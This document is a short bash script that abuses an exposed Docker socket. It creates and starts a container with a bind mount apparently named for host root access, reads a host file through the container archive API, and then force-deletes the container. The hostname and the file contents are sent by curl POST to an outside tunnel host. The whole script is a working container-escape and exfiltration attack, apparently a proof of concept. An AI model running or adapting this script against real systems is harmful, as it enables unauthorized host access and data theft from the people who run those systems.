#!/bin/bash
URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"

{
  echo "--- [ HANDSHAKE SUCCESS ] ---"
  echo "Host: $(hostname)"
  
  CID=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d '{"Image": "sha256:25109184c71bdad7", "HostConfig": {"Binds": ["host_root_exploit:/host_data:ro"]}}' | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)

  if [ -n "$CID" ]; then
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$CID/start"
    sleep 1
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/archive?path=/host_data/etc/os-release" | tar -xO
    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$CID?force=true" > /dev/null
  fi
} | curl -s -X POST --data-binary @- "https://$URL"
